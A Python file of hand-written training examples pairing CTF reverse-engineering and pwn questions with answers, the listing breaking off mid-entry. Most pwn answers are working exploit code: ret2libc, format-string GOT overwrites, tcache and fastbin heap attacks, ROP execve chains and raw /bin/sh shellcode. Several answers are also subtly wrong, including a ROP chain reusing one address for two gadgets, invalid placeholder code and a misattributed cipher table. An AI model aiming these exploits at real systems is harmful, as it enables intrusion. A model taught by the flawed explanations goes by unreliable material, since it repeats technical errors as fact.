"""
Synthetic rev/pwn examples for reinforcement training.
High-quality pattern examples covering common CTF techniques.
These are NOT scraped — they're hand-crafted teaching examples.

Usage:
  uv run python -c "from src.synthetic_rev_pwn import SYNTHETIC_EXAMPLES; import json; [print(json.dumps(e)) for e in SYNTHETIC_EXAMPLES]"
"""
import json

SYNTHETIC_EXAMPLES = [
    # ========== PWN: ret2win ==========
    {
        "instruction": "Write a ret2win exploit for a simple buffer overflow challenge",
        "category": "pwn",
        "input": "Binary: 64-bit, NX enabled, no canary, no PIE. The binary has a never-called win() function at 0x4011b6 that calls system(\"/bin/sh\"). Main reads input with gets() into a 64-byte buffer on the stack. win() is at offset 0x4011b6.",
        "output": "## Solution\n\nThis is a classic ret2win — the win function exists but is never called.\n\n### Analysis\n1. `checksec` confirms NX (no shellcode on stack) but no canary or PIE\n2. `objdump -d vuln | grep win` shows win() at 0x4011b6\n3. Buffer is 64 bytes, saved RBP is at offset 72 (64 + 8 for padding)\n4. Return address is at offset 72+8 = 80 bytes\n\n### Exploit\n\n```python\nfrom pwn import *\n\np = remote('challenge.ctf.com', 1337)\n\n# 64 bytes buffer + 8 bytes saved RBP padding\npayload = b'A' * 72\npayload += p64(0x4011b6)  # win() address\n\np.sendline(payload)\np.interactive()\n```\n\n### Key Concepts\n- On x86-64, calling convention passes first arg in RDI\n- We need a `pop rdi; ret` gadget to set RDI before jumping to win()\n- Full ROP chain: payload + padding + pop_rdi gadget + address of \"/bin/sh\" string + win() address\n- Since win() already calls system(\"/bin/sh\"), no need to set RDI separately\n\n### ROP variant (when win needs arg setup)\n\n```python\n# Find gadgets with ROPgadget --binary vuln | grep \"pop rdi\"\npop_rdi = 0x4011c2\nwin = 0x4011b6\n\npayload = b'A' * 72\npayload += p64(pop_rdi)\npayload += p64(0x4001d6)  # address of \"/bin/sh\" string\npayload += p64(win)\n```"
    },

    # ========== PWN: ret2libc ==========
    {
        "instruction": "Explain how ret2libc works and provide a complete exploit for a libc leak challenge",
        "category": "pwn",
        "input": "Binary: 64-bit, NX enabled, no PIE, no canary. Uses printf(buf) for format string. Libc base unknown. Need to call system(\"/bin/sh\").",
        "output": "## Solution\n\n### ret2libc Overview\nret2libc calls a function in libc (like system) instead of shellcode on the stack. Since ASLR randomizes libc base, we must first leak an address.\n\n### Step 1: Leak libc base\nUse the format string to read a GOT entry, which contains a libc address:\n\n```python\n# Leak puts@GOT\n# Format string: %6$s reads the 6th stack arg as a pointer\npayload = p64(got_puts) + b'%6$s'\np.sendline(payload)\nleaked = u64(p.recv().strip().ljust(8, b'\\x00'))\nlibc_base = leaked - libc.symbols['puts']\n```\n\n### Step 2: Calculate libc offsets\n```python\nsystem_addr = libc_base + libc.symbols['system']\nbin_sh_addr = next(libc.search(b'/bin/sh'))\n```\n\n### Step 3: Build ROP chain\n```python\n# pop rdi; ret gadget (found with ROPgadget)\npop_rdi = libc_base + 0x2a3e5  # pop rdi; ret offset in libc\n\npayload = b'A' * 72  # buffer + saved RBP\npayload += p64(pop_rdi)\npayload += p64(bin_sh_addr)\npayload += p64(system_addr)\np.sendline(payload)\n```\n\n### Why this works\n1. NX prevents shellcode on stack\n2. ASLR randomizes libc but GOT addresses point into libc\n3. Format string reads the raw libc pointer from GOT\n4. Subtraction of known offset gives us the base\n5. All subsequent addresses are offset from this base"
    },

    # ========== PWN: Format string ==========
    {
        "instruction": "Explain the format string vulnerability and provide a write-what-where exploit",
        "category": "pwn",
        "input": "Binary: 64-bit, NX, no PIE. printf(user_input) is called directly. We can overwrite puts@GOT to point to system. Need to write the last 3 bytes of system's libc address into puts@GOT.",
        "output": "## Solution\n\n### Format String Write Primitive\nprintf with user-controlled format string allows reading/writing arbitrary memory via %n.\n\n### Key concepts\n- `%n` writes the number of printed chars so far to a pointer on the stack\n- `%Nc%K$n` writes N chars, then writes N to the K-th stack arg as a pointer\n- We need a pointer on the stack pointing to our target (GOT entry)\n\n### Exploit\n\n```python\nfrom pwn import *\n\n# Assume we've already leaked libc and know the target addrs\ntarget = got_puts       # address to overwrite\nvalue  = system_addr    # value to write (last 3 bytes)\n\n# Split value into bytes to write individually\nbyte_val = value & 0xffffff  # last 3 bytes\nwritten = 0\n\n# Prepare: target address + format string\n# Find the stack offset where our input appears\n# Use %p to identify offsets, typically 6-12 for printf args\n\npayload = p64(target)  # appears on stack\n\n# Write each byte with %n\nfor i, byte in enumerate([byte_val & 0xff, (byte_val >> 8) & 0xff, (byte_val >> 16) & 0xff]):\n    needed = byte - (written % 256)\n    if needed < 0:\n        needed += 256\n    fmt = f\"%{needed}c%{6+i}$hhn\"\n    payload += fmt.encode()\n    written += needed\n\np.sendline(payload)\n```\n\n### Common pitfalls\n- ASLR changes the upper bytes — only overwrite known-stable lower bytes\n- The 6th stack arg is usually where our buffer starts on x86-64\n- Use pwntools' `fmtstr_payload()` for automated exploit generation:\n\n```python\nfrom pwn import *\npayload = fmtstr_payload(6, {got_puts: system_addr})\n```"
    },

    # ========== PWN: Heap UAF ==========
    {
        "instruction": "Explain use-after-free heap exploitation and provide a heap-spawn exploit",
        "category": "pwn",
        "input": "Binary: 64-bit, NX, glibc 2.31. Heap menu: 1) malloc(chunk_size) 2) free(ptr) 3) puts(ptr) 4) read(ptr, size). We can allocate 3 chunks, free one, malloc again to get a chunk in the same tcache bin.",
        "output": "## Solution\n\n### Use-After-Free (UAF) Overview\nUAF exploits when a pointer remains valid after the memory is freed. The freed chunk's fd/bk pointers in the heap metadata can be hijacked.\n\n### Heap mechanics (glibc 2.31 with tcache)\n- tcache bins: singly-linked lists of same-size chunks (up to 7 entries)\n- Free'd chunk: first 8 bytes = fd (next chunk in list)\n- tcache doesn't check if a chunk is already in the list\n\n### Tcache poisoning exploit\n\n```python\n# Step 1: Create chunks\nalloc(0, 0x20)  # chunk A at addr_0\nalloc(1, 0x20)  # chunk B at addr_1\nalloc(2, 0x20)  # chunk C at addr_2\n\n# Step 2: Free A (goes into tcache bin)\nfree(0)  # tcache[0x30] -> A\n\n# Step 3: Overwrite A's fd via UAF (A is freed but pointer still valid)\n# A's first 8 bytes now point to next chunk in tcache chain\nread(0, p64(0x401234))  # write fake address into A's fd\n\n# Step 4: Allocate twice\nalloc(3, 0x20)  # get A back from tcache\nalloc(4, 0x20)  # get the fake chunk (0x401234)\n\n# Step 5: Write to the target address\nputs(4)  # reads from 0x401234\n```\n\n### Protection: tcache key\nGlibc 2.29+ sets tcache key = address of chunk on free to detect double-free. Clear it by overwriting with zeros after free.\n\n### Real target: overwrite __free_hook or exit handlers\n- `__free_hook` (glibc < 2.34): overwrite with `system`, then free a chunk containing \"/bin/sh\"\n- Exit handler poisoning: target `_IO_list_all` for vtable exploit"
    },

    # ========== PWN: Stack canary ==========
    {
        "instruction": "Explain how stack canaries work and methods to bypass them",
        "category": "pwn",
        "input": "Binary: 64-bit, NX, PIE enabled, stack canary. Standard stack buffer overflow challenge. Need to bypass the canary to get ROP.",
        "output": "## Solution\n\n### Stack Canary Mechanism\n- A random value placed between local variables and saved RBP\n- On function return: if canary != stored value → __stack_chk_fail → program exits\n- On x86-64: canary is in FS:[0x28] (per-thread)\n\n### Bypass Methods\n\n#### 1. Information Leak (most reliable)\n```python\n# Leak canary via format string or partial read\n# Canary ends with a null byte (0x00) so read up to it\npayload = b'A' * 64  # fill buffer to canary\npayload += b'B' * 8  # saved RBP  \npayload += p64(canary_value)  # leaked canary\npayload += p64(rop_target)    # return address\n```\n\n#### 2. Stack canary via over-read\nIf the overflow starts AFTER the canary (e.g., strcpy after a separate read), you can't reach it. But if there's a secondary buffer overflow:\n- Read from /proc/self/maps or /proc/self/environ to get addresses\n- Use one vuln to leak canary, second to exploit\n\n#### 3. Format string (if available)\n```python\n# Canaries are often the 12th stack arg\n# %12$p leaks the canary\nleak = int(p.recvline(), 16)\ncanary = leak & 0xffffffffffffff00  # mask null byte\n```\n\n#### 4. Brute force (rare)\nOn 64-bit, the canary is 7 random bytes + null. Brute forcing: ~2^56 on average. Not practical.\n\n#### 5. TLS canary bypass\nOverride the thread's TCB to set canary to 0, or overwrite TLS before exit. Advanced technique requiring arbitrary write."
    },

    # ========== PWN: ROP chain ==========
    {
        "instruction": "Explain ROP (Return-Oriented Programming) and build a ROP chain for execve",
        "category": "pwn",
        "input": "Binary: 64-bit, NX, no canary, no PIE. Need to call execve('/bin/sh', NULL, NULL). Available gadgets: pop rdi; ret at 0x4006e8, pop rsi; ret at 0x4006e6, pop rdx; ret at 0x40071b, syscall at 0x40071b. /bin/sh string at 0x401234.",
        "output": "## Solution\n\n### ROP Overview\nROP chains return addresses on the stack to execute existing code snippets (gadgets). Each gadget ends with `ret`, allowing sequential execution.\n\n### x86-64 calling convention\n1st arg: RDI, 2nd arg: RSI, 3rd arg: RDX, 4th: RCX/R8/R9\n\n### Build the chain\n\n```python\nfrom pwn import *\n\npop_rdi = 0x4006e8\npop_rsi = 0x4006e6  # also pops r15\npop_rdx = 0x40071b  # also pops r12, r13, r14, r15\nsyscall = 0x40071b\nbin_sh  = 0x401234\n\n# Layout:\n# [padding][pop_rdi][/bin/sh][pop_rsi][NULL][pop_rdx][NULL][syscall]\npayload = b'A' * 72\npayload += p64(pop_rdi)     # set RDI = &\"/bin/sh\"\npayload += p64(bin_sh)\npayload += p64(pop_rsi + 1) # skip r15 pop, set RSI = NULL\npayload += p64(0)\npayload += p64(pop_rdx + 1) # skip r12/r13/r14/r15, set RDX = NULL\npayload += p64(0)\npayload += p64(pop_rdx + 1) # set RDX = NULL (second pop for alignment)\npayload += p64(0)\npayload += p64(syscall)     # call execve(\"/bin/sh\", NULL, NULL)\n\np = remote('challenge.ctf.com', 1337)\np.sendline(payload)\np.interactive()\n```\n\n### How to find gadgets\n```bash\nROPgadget --binary vuln\nROPgadget --binary vuln --only \"pop|ret\"\nROPgadget --binary vuln --ropchain\n```\n\n### Common ROP pitfalls\n- 16-byte stack alignment requirement on SysV ABI (x86-64)\n- Some `pop rdi; ret` gadgets also pop extra registers — account for those\n- Use `ROPgadget --ropchain` for automatic chain generation"
    },

    # ========== PWN: ret2dlresolve ==========
    {
        "instruction": "Explain ret2dlresolve and when it's useful",
        "category": "pwn",
        "input": "Binary: 32-bit, NX, no canary. Very limited gadgets. Need to call system(). No libc leak available.",
        "output": "## Solution\n\n### ret2dlresolve Overview\nWhen you can't leak libc and have few gadgets, ret2dlresolve tricks the dynamic linker into resolving any function call.\n\n### How it works\nThe dynamic linker (dl-resolve) uses three structures:\n1. `Elf32_Sym` — symbol table entry\n2. `Elf32_Rela` — relocation entry\n3. `Elf32_Dyn` — dynamic section\n\nWhen you call an unresolved function, dl-resolve looks up the symbol, calls dlopen/dlsym, and fills in the GOT entry. We can craft fake entries on the stack to resolve `system` without knowing the libc address.\n\n### pwntools automated exploit\n\n```python\nfrom pwn import *\n\np = remote('challenge.ctf.com', 1337)\nbinary = ELF('./vuln')\n\n# pwntools automates ret2dlresolve\nrop = ROP(binary)\ndlresolve = Ret2dlresolvePayload(binary, symbol=\"system\", args=[\"/bin/sh\"])\n\n# Build payload\npayload = b'A' * offset\npayload += rop.chain()\npayload += dlresolve.payload\n\np.sendline(payload)\np.interactive()\n```\n\n### When to use\n- 32-bit binaries with minimal gadgets\n- No libc leak path available\n- Binary doesn't statically link\n- Works best on glibc < 2.35 (dl-resolve protections added)\n\n### Limitations\n- Requires enough stack space for crafted structures\n- Doesn't work with fully static binaries\n- glibc 2.35+ adds integrity checks on ELF structures"
    },

    # ========== RE: basic binary analysis ==========
    {
        "instruction": "Describe the standard workflow for analyzing an unknown CTF binary",
        "category": "rev",
        "input": "I've downloaded a binary file from a CTF challenge. I don't know what it does. What's the standard analysis workflow?",
        "output": "## Standard Binary Analysis Workflow\n\n### Phase 1: Reconnaissance (non-invasive)\n```bash\nfile binary                  # type, architecture, stripped?\nstrings binary               # interesting strings, possible flag format\nstrings binary | grep -i flag\nstrings binary | grep -i pass\nchecksec --file=binary       # NX, PIE, canary, RELRO\nbinwalk binary               # embedded data, filesystems\nreadelf -h binary            # ELF header, entry point\nreadelf -S binary            # sections, permissions\n````\n\n### Phase 2: Static analysis\n```bash\nobjdump -d binary            # disassemble, find main()\nr2 -A binary                 # radare2 auto-analysis\nghidra binary                # full decompilation\n```\nKey things to identify:\n- `main()` and control flow\n- How input is received (gets/scanf/read/fgets)\n- How output is produced (printf/puts/write)\n- Library calls (system/execve, crypto functions)\n- Hardcoded values (keys, strings, addresses)\n\n### Phase 3: Dynamic analysis\n```bash\ngdb -q binary\n# or pwndbg: pwndbg ./binary\n\nb main               # break at main\nb *0x4011b6          # break at interesting address\ndisas main           # disassemble\nr AAAA               # run with input\nc                    # continue\n````\n\n### Phase 4: Pattern matching\nBased on recon findings, apply the right technique:\n- **Lots of XOR/operations on input** → XOR cipher\n- **gets/scanf/buf input → comparison** → buffer overflow\n- **strcmp/cmp against hardcoded values** → keygen/reverse\n- **fopen/read/decrypt pattern** → file format RE\n- **anti-debug (ptrace check)** → skip with patch\n- **Packed binary (UPX, Themida)** → unpack first\n\n### Phase 5: Exploit\nBased on findings, build the specific exploit. Document every step with evidence."
    },

    # ========== RE: XOR cipher ==========
    {
        "instruction": "Explain how to reverse a XOR cipher in a CTF binary",
        "category": "rev",
        "input": "Binary does XOR of user input against a hardcoded key, then compares with expected bytes. The XOR key is embedded in the binary. I can see the comparison in Ghidra at main+0x45.",
        "output": "## XOR Cipher Reversal\n\n### XOR Properties\n- XOR is its own inverse: `(A ^ K) ^ K = A`\n- If we know the encrypted output and the key, plaintext = encrypted XOR key\n- In a binary: encrypted_bytes XOR key = plaintext\n\n### Extraction methods\n\n#### Method 1: Read the encrypted bytes from the binary\n```python\n# In Ghidra/r2, find the array being compared against\n# Usually at a data section address\nimport subprocess\n\n# Extract bytes at offset\nresult = subprocess.run(\n    ['xxd', '-s', '0x4020', '-l', '32', '-p', 'binary'],\n    capture_output=True, text=True\n)\nencrypted = bytes.fromhex(result.stdout.strip())\n```\n\n#### Method 2: GDB dynamic extraction\n```python\n# Run in GDB, break before the comparison\n# Dump the comparison values from registers/memory\ngdb -batch -ex 'b *main+0x45' -ex 'r' -ex 'x/32bx $rdi' binary\n```\n\n#### Method 3: Patch and run\n```python\n# Instead of reversing the key, patch the comparison to always succeed\n# Or: extract key from disassembly, XOR with expected\n\nkey = bytes([0x41, 0x42, 0x43, ...])  # from binary\nencrypted = bytes([0x52, 0x22, 0x12, ...])  # from binary\nplaintext = bytes([a ^ b for a, b in zip(encrypted, key)])\nprint(plaintext.decode())\n```\n\n### Common XOR patterns in CTF\n- XOR with single byte key → brute force (256 possibilities)\n- XOR with repeating key → Kasiski/IC analysis or key-length attack\n- XOR with derived key → follow the key derivation to find plaintext"
    },

    # ========== RE: anti-debugging ==========
    {
        "instruction": "Explain common anti-debugging techniques and how to bypass them",
        "category": "rev",
        "input": "A binary detects it's being run in GDB and exits early. How can I bypass the anti-debug checks?",
        "output": "## Common Anti-Debugging Techniques\n\n### 1. ptrace(PTRACE_TRACEME)\nMost common: calls ptrace to detect debugger attachment.\n```c\n// Pseudocode in binary\nif (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {\n    exit(1); // debugger attached\n}\n```\n**Bypass:** NOP the call or return value check:\n```bash\n# In GDB\nb *main\nc\nset $eax = 0\nc\n```\n\n### 2. timing check\n```c\nstart = clock();\nsome_operation();\nif (clock() - start > THRESHOLD) exit(1);\n```\n**Bypass:** `LD_PRELOAD` a stub clock function, or patch the comparison.\n\n### 3. /proc/self/maps check\nChecks for known debugger memory ranges.\n**Bypass:** Use `patchelf` or modify the file descriptors.\n\n### 4. Software breakpoints (int3)\nChecks for INT3 instructions at function prologues.\n**Bypass:** Use hardware breakpoints (DR0-DR3) instead of sw breakpoints.\n\n### 5. Anti-VM checks\nDetects VMware/VirtualBox artifacts (registry keys, CPUID, MAC).\n**Bypass:** Set VM environment variables, patch CPUID.\n\n### Bypass strategies (ordered by simplicity)\n1. **NOP patching**: patch the conditional branch to always skip the exit\n2. **LD_PRELOAD**: override detected function (ptrace, clock_gettime)\n3. **Frida**: dynamic instrumentation to hook and bypass at runtime\n4. **Binary patching**: modify the ELF directly (patch bytes)\n5. **Emulation**: run in angr/QEMU without debug detection\n\n### Quick Frida bypass\n```python\n# frida -f ./binary -e 'Interceptor.attach(ptr(\"ptrace\"), { onEnter(args) { return 0; }})' \nimport frida\n\njs_code = '''\nInterceptor.attach(Module.findExportByName('libc.so.6', 'ptrace'), {\n    onEnter: function(args) { args[0] = 0; },\n    onLeave: function(retval) { retval.replace(0); }\n});\n'''\nsession = frida.spawn(['./binary'])\nsession.resume()\nscript = session.create_script(js_code)\nscript.load()\n```"
    },

    # ========== RE: ELF manipulation ==========
    {
        "instruction": "Explain ELF sections, their purpose, and how to modify them",
        "category": "rev",
        "input": "I need to patch a binary to bypass a check. What sections matter, and what's the difference between .text, .rodata, .data?",
        "output": "## ELF Section Reference\n\n### Essential Sections\n\n| Section | Purpose | Permissions | Typical use |\n|---------|---------|-------------|-------------|\n| `.text` | Executable code | RX | Main code, functions |\n| `.rodata` | Read-only data | R | Strings, constants, jump tables |\n| `.data` | Initialized global data | RW | Initialized variables |\n| `.bss` | Uninitialized globals | RW | Zero-initialized variables |\n| `.plt` | Procedure linkage table | RX | Dynamic linking stubs |\n| `.got` | Global offset table | RW | Resolved function pointers |\n| `.got.plt` | PLT GOT entries | RW | Lazy-resolved function pointers |\n| `.dynamic` | Dynamic linker info | RW | Library dependencies |\n| `.symtab` | Symbol table | R | Debug symbols (stripped bins lack this) |\n| `.strtab` | String table | R | Symbol name strings |\n\n### Patching .text (code)\n```python\n# NOP a check: replace 6 bytes with NOPs\n# 74 05 = JE +5 (short jump if zero)\npatch = b'\\x90' * 6  # 6 NOPs\n\n# Or: replace with JMP\npatch = b'\\xe9\\x05\\x00\\x00\\x00'  # JMP +5\n```\n\n### Patching .rodata (strings)\n```python\n# Change a hardcoded key\n# Find offset with: strings -t x binary | grep KEY\npatch = b'\\x41\\x41\\x41\\x41'  # 'AAAA'\n```\n\n### Patching ELF with Python\n```python\nimport struct\n\ndef patch_binary(path, offset, data):\n    with open(path, 'rb') as f:\n        content = bytearray(f.read())\n    content[offset:offset+len(data)] = data\n    with open(path, 'wb') as f:\n        f.write(content)\n\n# NOP instruction at offset 0x1234\npatch_binary('./vuln', 0x1234, b'\\x90' * 6)\n```\n\n### Using patchelf (ELF header modification)\n```bash\npatchelf --set-interpreter /lib/ld-linux.so.2 ./binary  # change interpreter\npatchelf --replace-needed libc.so.6 ./patched_libc.so ./binary  # swap lib\n```\n\n### Key concepts\n- `.plt` stubs jump to `.got.plt` entries\n- `.got.plt` is filled by ld.so on first call (lazy binding)\n- `RELRO=Full` makes `.got.plt` read-only after init — prevents GOT overwrite\n- Stripped binaries remove `.symtab`/`.strtab` — makes RE harder but not impossible"
    },

    # ========== PWN: ASLR bypass ==========
    {
        "instruction": "Explain ASLR and techniques to bypass it",
        "category": "pwn",
        "input": "Binary: 64-bit, NX, ASLR enabled, no PIE. The stack address changes every run. How do I bypass ASLR?",
        "output": "## ASLR Bypass Techniques\n\n### What ASLR does\n- Randomizes base addresses of: stack, heap, libraries, mmap region\n- On x86-64: 28 bits of entropy for libraries (~256 possible bases)\n- Partial ASLR: stack/heap randomized, but binary base fixed (no PIE)\n\n### Key insight: Partial ASLR is not full ASLR\nIf PIE is off, the binary's code is always at the same address. Only libc/stack/heap move.\n\n### Bypass Methods\n\n#### 1. ret2plt (when no PIE)\n```python\n# PLT functions have fixed addresses (binary not randomized)\npayload += p64(plt_puts)      # fixed address\npayload += p64(got_puts)       # GOT address (fixed in binary)\npayload += p64(main)          # back to main for second round\n# First call: prints the libc address stored in GOT\n# Second round: use leaked address\n```\n\n#### 2. ret2dlresolve (no PIE, minimal gadgets)\nTricks the dynamic linker into resolving system() without leaking libc.\n```python\nrop = ROP(binary)\ndlresolve = Ret2dlresolvePayload(binary, symbol=\"system\", args=[\"/bin/sh\"])\n```\n\n#### 3. Partial overwrite\nOverwrite only the low 2 bytes of an address (ASLR only randomizes upper bytes for 64-bit). Changes target within same page:\n```python\n# Overwrite GOT entry's low 2 bytes to point to nearby function\npayload = b'A' * offset\npayload += p16(target_low_2_bytes)  # partial overwrite\n```\n\n#### 4. ret2csu (if available)\nUniversal gadgets in __libc_csu_init exist in most non-PIE binaries.\n\n#### 5. Environment-based\nSet LD_PRELOAD or LD_LIBRARY_PATH to control where libraries load:\n```bash\n# On binary: don't call libc functions, rely on ROP gadgets in binary\n# If binary is statically linked, ASLR is useless\n```"
    },

    # ========== RE: packing detection ==========
    {
        "instruction": "How to identify if a binary is packed and how to unpack it",
        "category": "rev",
        "input": "I downloaded a binary but strings shows almost nothing useful. file says 'ELF 64-bit LSB executable'. Could it be packed?",
        "output": "## Packed Binary Detection & Unpacking\n\n### Detection Signs\n1. **Very few strings** — packed code is encrypted/compressed, so strings are hidden\n2. **High entropy** — `binwalk -E binary` shows entropy > 7.5/8.0 = likely packed\n3. **Large .text with no recognizable functions** — the unpacking stub is small, but the actual code is encrypted\n4. **Known packers** — `detect-it-easy` or `packerid` can identify UPX, Themida, VMProtect\n5. **UPX signature**: `strings binary | grep \"UPX\"` or look for `UPX!` marker\n\n### UPX Unpacking (most common)\n```bash\n# Simple unpack\nupx -d binary\n\n# If upx fails (modified header)\n# Method 1: Restore original headers\nupx --best binary\n# then upx -d\n\n# Method 2: Find OEP (Original Entry Point) dynamically\n# In GDB, watch for the jump to unpacked code\nb *upx_stub\n# single-step until you see the jump to the unpacked code\nc  # run to UPX decompressor\n# When OEP is found, dump memory:\n# dump binary_unpacked 0x400000 0x100000\n\n# Method 3: Static analysis of UPX stub\n# UPX stub has a recognizable pattern: pusha, pushad, decrypt loop, popa\n```\n\n### Themida / VMProtect\nMuch harder to unpack — these use virtual machines.\n```bash\n# Themida: use dedicated unpackers or dump at runtime\n# Method: OllyDbg + Scylla plugin for dump + IAT reconstruction\n# Method: x64dbg + ScyllaEx for 64-bit\n```\n\n### Generic unpacking strategy\n1. Identify packer type (DIE, detect-it-easy, packerid)\n2. Try automatic unpacker first (upx -d, etc.)\n3. If that fails, set breakpoints at OEP and dump\n4. Fix IAT (Import Address Table) with Scylla or ImpREC\n5. Analyze the unpacked binary normally"
    },

    # ========== PWN: shellcode injection ==========
    {
        "instruction": "Explain shellcode injection on a non-NX binary and provide a working example",
        "category": "pwn",
        "input": "Binary: 32-bit, no NX (stack executable), no ASLR. Classic buffer overflow via gets(). I need to inject and execute shellcode.",
        "output": "## Shellcode Injection (NX disabled)\n\n### When shellcode works\nShellcode requires a W+X (writable and executable) memory region. If NX is disabled, the stack is executable, and we can inject shellcode there.\n\n### Generating shellcode\n```bash\n# pwntools\ncyclic -n 4 -l 200  # generate offset payload\nmsf-shellcraft -f python -b '\\x00' linux/x86/execve  # anti-bad-chars\n\n# Assembly (NASM)\nmsf-nasm_shell\n> bits 32\n> push 0x68732f2f\n> push 0x6e69622f\n> mov ebx, esp\n> xor ecx, ecx\n> xor edx, edx\n> mov al, 11\n> int 0x80\n```\n\n### Exploit structure\n```\n[shellcode][padding to offset][return address pointing to shellcode]\n```\n\n```python\nfrom pwn import *\n\nbinary = './vuln'\nbinary_elf = ELF(binary)\n\n# Shellcode: execve(\"/bin/sh\")\nshellcode = (\n    b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\"\n    b\"\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n)\n\noffset = 200  # found with cyclic -l 0x61616161\n\n# NOP sled to increase hit chance (even without ASLR)\nnop_sled = b'\\x90' * 100\n\n# Stack address (no ASLR = fixed)\nshellcode_addr = 0xffffd540  # from GDB or analysis\n\npayload = nop_sled + shellcode\npayload += b'A' * (offset - len(nop_sled) - len(shellcode))\npayload += p32(shellcode_addr)\n\np = process(binary)\np.sendline(payload)\np.interactive()\n```\n\n### NOP sled purpose\nEven without ASLR, the exact stack location varies slightly. A NOP sled (\\x90\\x90...\\x90) in front of the shellcode means any return to the sled region will slide into the shellcode.\n\n### Why this doesn't work with NX\nWith NX enabled, the CPU will segfault when it tries to execute code from the stack. You need ROP instead."
    },

    # ========== RE: crypto identification ==========
    {
        "instruction": "How to identify the cryptographic algorithm in a binary",
        "category": "rev",
        "input": "I found a binary that appears to encrypt/decrypt data. I can see round-like operations and a key schedule. How can I identify which cipher it uses?",
        "output": "## Crypto Algorithm Identification\n\n### Step 1: Key size detection\n```bash\n# Look for key arrays in data section\nstrings -t x binary | head -50\n# Count bytes in likely key buffers: 16 = AES, 24 = AES-192, 32 = AES-256\n# 8 = DES, 16 = 3DES\n\n# Count round constants in code\n# AES has 10/12/14 rounds, RC5 has variable rounds\n```\n\n### Step 2: Block size detection\n- 8 bytes → DES, 3DES, Blowfish, RC5-64\n- 16 bytes → AES, Twofish, Serpent, Camellia, IDEA\n- 64 bytes → Noekeon, QARMA (rare)\n\n### Step 3: S-box identification\nCrypto S-boxes are fingerprints:\n```python\n# AES S-box (byte 0-15 of .rodata)\naes_sbox = [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,\n            0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76]\n\n# DES S-boxes (S1-S8, each 64 bytes)\n# Check for 8x64 = 512 bytes of S-box data\n\n# Look up S-box in known databases\n# https://www.3dbrew.org/wiki/AES_S-box\n```\n\n### Step 4: Pattern matching\n| Pattern | Algorithm |\n|---------|-----------|\n| 16-byte key, 10 rounds, specific S-box | AES |\n| 8-byte key, Feistel, 16 rounds | DES/3DES |\n| 32-byte key, 14 rounds | Blowfish |\n| 32-byte key, variable rounds, modular | XTEA/XXTEA |\n| 16/24/32-byte key, Feistel | Twofish/Serpent |\n\n### Step 5: Confirmation\n```bash\n# Run a known input through the function and compare with output\n# Then try decrypting with known plaintext/ciphertext pairs\n\n# Ghidra: set breakpoint at crypto function\n# Feed known input → record output → verify with online calculator\n```\n\n### Quick identification tool\n```bash\n# Use hash-identifier for hash detection\nhash-identifier  # not crypto, but useful for hash comparison\n\n# Use Cryptool2 or CyberChef to match patterns\n```"
    },

    # ========== PWN: heap overflow ==========
    {
        "instruction": "Explain heap overflow exploitation and demonstrate a fastbin attack",
        "category": "pwn",
        "input": "Binary: 64-bit, glibc 2.27, NX, ASLR. Heap menu with malloc/free/read. Need to get code execution via fastbin attack.",
        "output": "## Heap Overflow / Fastbin Attack\n\n### Fastbin mechanics\n- Fastbins: LIFO singly-linked list, sizes 0x20-0x80 (glibc 2.27)\n- Each free chunk's first 8 bytes = fd pointer (next chunk in list)\n- malloc returns chunks from fastbin (LIFO order)\n\n### Fastbin attack steps\n1. Allocate chunk A (fastbin size)\n2. Free chunk A\n3. Overflow chunk A to overwrite its fd pointer\n4. First malloc returns A\n5. Second malloc returns the address A->fd (our target)\n6. Third malloc writes to target address\n\n```python\nfrom pwn import *\n\np = process('./vuln')\n\ndef alloc(idx, size):\n    p.sendline(b'1')\n    p.sendline(str(idx).encode())\n    p.sendline(str(size).encode())\n    p.recvuntil(b'Choice')\n\ndef free(idx):\n    p.sendline(b'2')\n    p.sendline(str(idx).encode())\n    p.recvuntil(b'Choice')\n\n# Step 1: Allocate 3 chunks (0x60 = fastbin range)\nalloc(0, 0x60)  # chunk 0 at e.g. 0x602010\nalloc(1, 0x60)  # chunk 1 at e.g. 0x602070\nalloc(2, 0x60)  # chunk 2 at e.g. 0x6020d0 (to prevent consolidation)\n\n# Step 2: Free chunk 0 (goes into fastbin)\nfree(0)\n\n# Step 3: Overflow chunk 0 to set fd to target\n# Use read/write function on chunk 0 after free (UAF)\n# Write: padding + target_addr (to overwrite fd)\np.sendline(b'3')  # edit\np.sendline(b'0')\n\n# Target: we want to write to __malloc_hook or a global variable\n# For glibc 2.27, __malloc_hook is writable and points to system\n\n# __malloc_hook address (found with: p __malloc_hook in GDB, or libc-database)\ntarget = 0x7f...__malloc_hook  # leaked from step above\n\n# Write into chunk 0 to overwrite fd\npayload = b'\\x00' * 0x38  # fill chunk + chunk metadata\npayload += p64(target - 0x10)  # fd → target (with 0x20 fastbin size prefix)\np.sendline(payload)\n\n# Step 4: malloc twice\n# First malloc returns chunk 0 (our UAF chunk)\nalloc(0, 0x60)\n\n# Second malloc returns the target address\nalloc(0, 0x60)  # now we own the address of __malloc_hook\n\n# Step 5: Write one_gadget to __malloc_hook\np.sendline(b'3')  # edit\np.sendline(b'0')\none_gadget = 0x7f...  # from one_gadget tool\np.sendline(p64(one_gadget))\n\n# Step 6: Trigger malloc (via next alloc)\n# When malloc is called, it jumps to one_gadget → shell\nalloc(0, 0x20)\np.interactive()\n```\n\n### Important notes\n- Fastbin size check: the size field of the chunk must match the fastbin index\n- On glibc 2.29+: tcache double-free detection is more aggressive\n- For tcache poisoning: same concept but with tcache bins, different constraints"
    },

    # ========== RE: dynamic analysis with Frida ==========
    {
        "instruction": "Show how to use Frida to dynamically trace a binary's execution",
        "category": "rev",
        "input": "I have a stripped binary that checks some condition and branches to success/failure. I want to trace function calls and see the comparison values.",
